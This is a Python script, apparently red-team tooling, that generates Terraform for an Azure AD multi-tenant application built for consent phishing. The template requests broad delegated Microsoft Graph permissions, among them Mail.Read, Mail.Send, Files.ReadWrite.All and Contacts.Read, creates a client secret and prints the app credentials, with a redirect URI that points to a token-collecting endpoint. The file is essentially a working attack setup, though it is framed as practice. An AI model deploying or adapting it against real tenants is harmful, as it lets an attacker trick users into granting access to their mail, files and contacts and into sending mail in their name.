# Create an app to practice consent phishing!  Writes phishing_app.tf.
# This script helps you to automatically and quickly write terraform
# From there you can customize your terraform further and create your own templates!
# Author:  Jason Ostrom
import os.path
import argparse

# argparser stuff
parser = argparse.ArgumentParser(description='A script to create terraform for a consent phishing app')

# Add argument for application display name 
parser.add_argument('-n', '--name', dest='name')

# Add argument for redirect_uris 
parser.add_argument('-re', '--redirect_uris', dest='redirect_uris')

# Add argument for homepage_url 
parser.add_argument('-ho', '--homepage_url', dest='homepage_url')

# Add argument for logout_url 
parser.add_argument('-lo', '--logout_url', dest='logout_url')

# parse arguments
args = parser.parse_args()

# Azure phishing app terraform file
tapp_file = "phishing_app.tf"

# parse the name if specified
default_name = "Sample App"
if not args.name:
    print("[+] Using default application name: ", default_name)
else:
    default_name = args.name
    print("[+] User supplied application name: ", default_name)

# parse the redirect_uris if specified 
default_redirect_uris = "http://localhost:30662/gettoken" 
if not args.redirect_uris:
    print("[+] Using default redirect_uris: ", default_redirect_uris)
else:
    default_redirect_uris = args.redirect_uris
    print("[+] User supplied redirect_uris: ", default_redirect_uris)

# parse the homepage_url if specified
default_homepage_url = "https://localhost:30662"
if not args.homepage_url:
    print("[+] Using default homepage_url: ", default_homepage_url)
else:
    default_homepage_url = args.homepage_url
    print("[+] User supplied homepage_url: ", default_homepage_url)

# parse the logout_url if specified
default_logout_url = "https://localhost:30662/logout"
if not args.logout_url:
    print("[+] Using default logout_url: ", default_logout_url)
else:
    default_logout_url = args.logout_url
    print("[+] User supplied logout_url: ", default_logout_url)

#####
# Functions
#####

# Get the terraform template
def get_code_template():
    template = '''

variable "display_name" {
  description = "The application display name"
  default = "DISPLAY_NAME"
}

variable "redirect_uris" {
  default = "REDIRECT_URIS"
}

variable "homepage_url" {
  default = "HOMEPAGE_URL"
}

variable "logout_url" {
  default = "LOGOUT_URL"
}

resource "azuread_application_password" "app_consent" {
  application_object_id = azuread_application.app_consent.object_id
}

data "azuread_client_config" "current" {}

# Create service principal
resource "azuread_service_principal" "app_consent" {
  application_id = azuread_application.app_consent.application_id

 depends_on = [azuread_application.app_consent]
}

resource "azuread_application" "app_consent" {
  display_name     = var.display_name
  owners           = [data.azuread_client_config.current.object_id]
  sign_in_audience = "AzureADMultipleOrgs"

  feature_tags {
    enterprise = true
    gallery    = false
  }

  required_resource_access {
    resource_app_id = "00000003-0000-0000-c000-000000000000" # Microsoft Graph

    resource_access {
      id   = "ff74d97f-43af-4b68-9f2a-b77ee6968c5d" # Contacts.Read
      type = "Scope"
    }

    resource_access {
      id   = "570282fd-fa5c-430d-a7fd-fc8dc98a9dca" #  Mail.Read
      type = "Scope"
    }

    resource_access {
      id   = "e383f46e-2787-4529-855e-0e479a3ffac0" #  Mail.Send
      type = "Scope"
    }

    resource_access {
      id   = "10465720-29dd-4523-a11a-6a75c743c9d9" # Files.Read
      type = "Scope"
    }

    resource_access {
      id   = "df85f4d6-205c-4ac5-a5ea-6bf408dba283" # Files.Read.All
      type = "Scope"
    }

    resource_access {
      id   = "863451e7-0667-486c-a5d6-d135439485f0" # Files.ReadWrite.All
      type = "Scope"
    }

    resource_access {
      id   = "e1fe6dd8-ba31-4d61-89e7-88639da4683d" # User.Read
      type = "Scope"
    }

  }

  web {
    homepage_url  = var.homepage_url
    logout_url    = var.logout_url
    redirect_uris = [var.redirect_uris]
  }
}

output "client_secret" {
  value = azuread_application_password.app_consent.value
  description = "The client secret"
  sensitive = true
}

output "app_details" {
  value = <<EOS

-------------------
Application Details
-------------------
Name:  ${azuread_application.app_consent.display_name}
Client Id:  ${azuread_application.app_consent.application_id}
Redirect URL: ${var.redirect_uris}
To get the client_secret value:  terraform output client_secret
-------------------
Delegated scope Graph API Permissions
-------------------
Contacts.Read
Mail.Read
Mail.Send
Files.Read
Files.Read.All
Files.ReadWrite.All
User.Read

EOS
}
'''
    return template
# End of terraform template

# Write the phishing_app.tf file 
app_text_file = open(tapp_file, "w")

# Get the code template
default_app_template = get_code_template()

# replace the app display name variable
default_app_template = default_app_template.replace("DISPLAY_NAME",default_name) 

# replace the redirect_uris 
default_app_template = default_app_template.replace("REDIRECT_URIS",default_redirect_uris) 

# replace the homepage_url 
default_app_template = default_app_template.replace("HOMEPAGE_URL",default_homepage_url) 

# replace the logout_url 
default_app_template = default_app_template.replace("LOGOUT_URL",default_logout_url) 

# write the file
n = app_text_file.write(default_app_template)

# print
print("[+] Creating the phishing app terraform file: ",tapp_file)

# close the file
app_text_file.close()
